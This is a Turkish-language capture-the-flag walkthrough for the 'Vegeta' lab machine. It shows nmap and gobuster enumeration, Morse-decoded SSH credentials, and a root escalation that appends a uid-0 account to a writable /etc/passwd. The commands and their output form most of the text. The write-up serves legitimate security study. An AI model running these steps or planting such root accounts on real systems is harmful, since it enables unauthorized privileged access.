@@ -1,0 +1,106 @@
+      ####Enumeration
+
+      ####Nmap
+Bir tarama çalıştırarak başlıyoruz :
+kali@kali:~# sudo nmap $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 09:50 EDT
+Nmap scan report for $targetip
+Host is up (0.039s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+      ####Gobuster
+Ardından, gobusterwordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt ile aşağıdaki gibi bir tarama yapın:
+kali@kali:~# gobuster dir -u http://$targetip/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s '200,204,301,302,307,403,500' -e
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://$targetip/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,403,500
+[+] User Agent:     gobuster/3.0.1
+[+] Expanded:       true
+[+] Timeout:        10s
+===============================================================
+2020/08/04 10:23:13 Starting gobuster
+===============================================================
+http://192.168.120.161/img (Status: 301)
+http://192.168.120.161/image (Status: 301)
+http://192.168.120.161/admin (Status: 301)
+http://192.168.120.161/manual (Status: 301)
+http://192.168.120.161/server-status (Status: 403)
+http://192.168.120.161/find (Status: 301)
+===============================================================
+2020/08/04 10:35:05 Finished
+===============================================================
+Bu taramadan, dizin /find keşfedilir.
+
+Web Numaralandırma
+/find'a giderek bir wave dosyası hahahaha.wav buluyoruz :
+kali@kali:~# curl http://$targetip/bulma/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+...
+<tr><td valign="top"><img src="/icons/sound2.gif" alt="[SND]"></td><td><a href="hahahaha.wav">hahahaha.wav</a></td><td align="right">2020-06-28 18:19  </td><td align="right">231K</td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+...
+Daha fazla araştırma için bu dosyayı indireceğiz:
+kali@kali:~# wget http://$targetip/find/hahahaha.wav
+--2020-08-04 11:03:30--  http://$targetip/find/hahahaha.wav
+Connecting to $targetip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 236124 (231K) [audio/x-wav]
+Saving to: ‘hahahaha.wav’
+
+hahahaha.wav                   100%[===================================================>] 230.59K   482KB/s    in 0.5s    
+
+2020-08-04 11:03:30 (482 KB/s) - ‘hahahaha.wav’ saved [236124/236124]
+
+      ####Exploitation
+
+      ####Mors kodu
+Wave dosyasını dinlerken, Mors kodu gibi geliyor. Sesi çözmek için https://morsecode.world/international/decoder/audio-decoder-adaptive.html gibi çevrimiçi bir Mors kodu ses kod çözücüsü kullanabiliriz.
+Kod çözme işleminden sonra aşağıdaki mesajı alırız:
+A TT TTT T TTT T7 trunks PASSWORD : $passwordcensored(S IN DOLLARS SYMBOL)
+Bu şu şekilde yorumlanabilir:
+Kullanıcı adı:trunks
+Şifre:$passwordcensored
+
+      ####SSH
+Unix'in küçük harfli kullanıcı adları standardına göre, kullanıcı adı parola çiftini trunks:$passwordcensored hedefe SSH ile deneyeceğiz:
+kali@kali:~# ssh trunks@$targetip
+trunks@$targetip's password: 
+Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+...
+trunks@Vegeta:~$ id
+uid=1000(trunks) gid=1000(trunks) groups=1000(trunks),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+
+                    
+/home/trunks/ ana dizininde .bash_history dosyası var:
+trunks@Vegeta:~$ ls -la
+total 28
+drwxr-xr-x 3 trunks trunks 4096 Jun 28 21:32 .
+drwxr-xr-x 3 root   root   4096 Jun 28 17:37 ..
+-rw------- 1 trunks trunks  382 Jun 28 21:36 .bash_history
+-rw-r--r-- 1 trunks trunks  220 Jun 28 17:37 .bash_logout
+-rw-r--r-- 1 trunks trunks 3526 Jun 28 17:37 .bashrc
+drwxr-xr-x 3 trunks trunks 4096 Jun 28 19:45 .local
+-rw-r--r-- 1 trunks trunks  807 Jun 28 17:37 .profile
+İçine bakıldığında aşağıdaki içeriği gösterir:
+trunks@Vegeta:~$ cat .bash_history 
+$censored.bash_historyfile
+Tom Bash geçmişinde başvurulan kullanıcıyı görüyoruz ; ancak kullanıcı /etc/passwd içinde mevcut değil :
+trunks@Vegeta:~$ cat /etc/passwd | grep Tom
+trunks@Vegeta:~$
+Ayrıca, /etc/passwd dosya izinlerini kontrol ederek kullanıcı trunks buna şunları yazabilir:
+trunks@Vegeta:~$ ls -la /etc/passwd
+-rw-r--r-- 1 trunks root 1486 Jun 28 21:23 /etc/passwd
+                    Aslında, /home/trunks/.bash_history içeriği, /etc/passwd öğesine neyin eklenmesi gerektiğine dair doğrudan ipuçları verir . Root yetkisini şu şekilde yükseltebiliriz (şifre olacaktır $censored):
+trunks@Vegeta:~$ echo "Tom:$censored:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
+trunks@Vegeta:~$ su Tom
+Password: 
+root@Vegeta:/home/trunks# id
+uid=0(root) gid=0(root) groups=0(root)                    
